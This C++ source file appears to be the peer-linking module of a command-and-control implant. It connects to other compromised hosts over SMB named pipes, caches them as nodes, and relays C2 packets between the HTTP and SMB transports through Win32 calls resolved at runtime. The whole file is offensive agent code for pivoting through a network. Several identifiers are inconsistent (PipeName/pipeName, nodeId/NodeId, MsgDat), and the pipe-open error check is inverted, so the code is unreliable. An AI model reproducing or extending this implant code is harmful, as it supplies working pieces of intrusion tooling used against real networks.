#include <core/include/peers.hpp>

using namespace Stream;
using namespace Dispatcher;
using namespace Network::Smb;

namespace Nodes {
	UINT32 PeekNodeId(PACKET* packet) {
		UINT32 pid = 0;

		MemCopy(&pid, (PBYTE)packet->MsgData + 1, sizeof(UINT32));
		return pid;
	}

	NODE* GetNode(const UINT32 nodeId) {
		auto head = Ctx->NodeCache;
		do {
			if (head) {
				if (head->nodeId == nodeId) {
					return head;
				}
				head = head->Next;
			}
			else return nullptr;
		} while (true);
	}

	BOOL RemoveNode(UINT32 nodeId) {
		NODE *head   = Ctx->NodeCache;
		NODE *target = GetNode(nodeId);
		NODE *prev   = nullptr;

		if (!head || !target) {
			return false;
		}
		while (head) {
			if (head == target) {
				if (prev) {
					prev->Next = head->Next;
				} else {
					Ctx->NodeCache = head->Next;
				}

				if (head->PipeName) {
					MemSet(head->PipeName, 0, WcsLength(head->PipeName));
					Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, head->PipeName);
				}
				if (head->PipeHandle) {
					Ctx->Win32.NtClose(head->PipeHandle);
					head->PipeHandle = nullptr;
				}

				head->nodeId = 0;
				return true;
			}
			prev = head;
			head = head->Next;
		}

		return false;
	}

	BOOL AddNode(const WCHAR* pipeName, const UINT32 nodeId) {
		PACKET *inPack = nullptr;
		NODE *node = nullptr;
		NODE *head = nullptr;

		LPVOID handle = nullptr;
		LPVOID buffer = nullptr;

		DWORD total = 0;
		DWORD read  = 0;

		// first contact
		if (!(handle = Ctx->Win32.CreateFileW(pipeName, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
			if (handle == INVALID_HANDLE_VALUE) {
				return false;
			}
			if (Ctx->Teb->LastErrorValue == ERROR_PIPE_BUSY) {
				if (!Ctx->Win32.WaitNamedPipeW(pipeName, 5000)) {
					Ctx->Win32.NtClose(handle);
					return false;
				}
			}
		}
		do {
			if (Ctx->Win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &total, nullptr)) {
				if (total) {
					inPack = CreatePacket();
					buffer = Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, total);

					if (!Ctx->Win32.ReadFile(handle, buffer, total, &read, nullptr) || read != total) {
						Ctx->Win32.NtClose(handle);
						return false;
					}

					inPack->MsgData = (PBYTE)buffer;
					inPack->MsgLength += total;

					MessageQueue(inPack);
					break;
				}
			}
		}
		while (true);

		node = (NODE*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(NODE));
		node->PipeHandle = handle;

		MemCopy(&node->nodeId, &nodeId, sizeof(uint32_t));
		MemCopy(node->pipeName, pipeName, WcsLength(pipeName) * sizeof(WCHAR));

		if (!Ctx->NodeCache) {
			Ctx->NodeCache = node;
		}
		else {
			head = Ctx->NodeCache;
			do {
				if (head) {
					if (head->Next) {
						head = head->Next;
					} else {
						head->Next = node;
						break;
					}
				} else break;
			} while (true);
		}

		return true;
	}

	VOID PushNodes() {
		BYTE bound = 0;
		DWORD read = 0;
		DWORD total = 0;

		for (auto node = Ctx->NodeCache; node; node = node->Next) {
			if (!Ctx->Win32.PeekNamedPipe(node->PipeHandle, &bound, sizeof(UINT8), nullptr, &read, nullptr) || read != sizeof(UINT8)) {
				continue;
			}
			if (!Ctx->Win32.PeekNamedPipe(node->PipeHandle, nullptr, 0, nullptr, &total, nullptr)) {
				continue;
			}
			// NOTE: Process packets that are outbound.
			if (bound == TRANSPORT_HTTP && total >= HEADER_SIZE) {
				PACKET *inPack = CreatePacket();
				LPVOID buffer = Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, total);

				if (!Ctx->Win32.ReadFile(node->PipeHandle, buffer, total, &read, nullptr) || read != total) {
					DestroyPacket(inPack);
					Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, buffer);
					continue;
				}

				inPack->MsgDat = (PBYTE)buffer;
				inPack->MsgLength = total;
				MessageQueue(inPack);
			} else {
				continue;
			}
		}

		// NOTE: Process packets that are inbound.
		for (auto outPack = Ctx->PacketCache; outPack; outPack = outPack->Next) {
			if (outPack->MsgData && (PBYTE)(outPack->MsgData)[0] == TRANSPORT_SMB) {

				for (auto node = Ctx->NodeCache; node; node = node->Next) {
					if (PeekNodeId(outPack) == node->NodeId) {
						if (PipeWrite(node->PipeHandle, outPack)) {
							RemoveMessage(outPack);
						}
					}
				}
			}
		}
	}
}
